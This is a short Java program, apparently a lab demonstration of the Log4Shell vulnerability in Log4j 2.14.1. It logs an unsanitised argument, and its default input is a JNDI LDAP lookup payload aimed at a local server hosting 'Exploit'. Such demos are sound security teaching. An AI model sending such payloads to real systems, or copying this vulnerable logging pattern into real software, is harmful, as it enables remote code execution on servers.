import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/** Loguje przekazany argument przez Log4j 2.14.1 (wektor JNDI). */
public class VulnerableLogger {
  private static final Logger log = LogManager.getLogger(VulnerableLogger.class);

  public static void main(String[] args) {
    String msg = args.length > 0 ? args[0] : "${jndi:ldap://127.0.0.1:1389/Exploit}";
    System.out.println("Victim logging: " + msg);
    log.error(msg);
    System.out.println("Done.");
  }
}
